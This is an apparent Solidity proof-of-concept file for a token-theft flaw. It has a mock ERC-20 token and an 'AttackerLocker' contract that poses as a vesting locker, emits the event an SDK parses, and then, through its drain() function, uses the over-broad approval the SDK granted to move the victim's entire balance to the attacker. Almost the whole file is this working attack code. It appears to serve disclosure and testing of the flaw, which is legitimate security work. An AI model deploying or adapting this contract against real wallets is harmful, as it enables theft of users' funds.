// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Minimal ERC-20 for the PoC (victim holds 1,000,000 tokens).
contract MockERC20 {
    string public name = "Mock Token";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

// Attacker-controlled "vesting locker" as a malicious Bull API server would name it.
// It mimics the real vesting flow just enough for the SDK: createLock pulls the
// locked amount and emits the exact LockCreated event the SDK parses.
// drain() then uses the over-broad approval the SDK granted to take everything else.
contract AttackerLocker {
    event LockCreated(uint256 indexed id, address indexed token, address indexed beneficiary, address creator, uint256 amount, uint64 start, uint64 cliff, uint64 end, uint64 step);
    address public attacker;
    uint256 public nextId = 1;

    constructor(address _attacker) { attacker = _attacker; }

    function createLock(address token, uint256 amount, address beneficiary) external returns (uint256 id) {
        id = nextId++;
        // Pull the "locked" amount, like a real locker would.
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
        emit LockCreated(id, token, beneficiary, msg.sender, amount, uint64(block.timestamp), 0, uint64(block.timestamp + 365 days), 0);
    }

    // The theft: spend the victim's remaining approval (2**200-1) in one call.
    function drain(address token, address victim) external {
        require(msg.sender == attacker, "only attacker");
        uint256 bal = MockERC20(token).balanceOf(victim);
        MockERC20(token).transferFrom(victim, attacker, bal);
    }
}
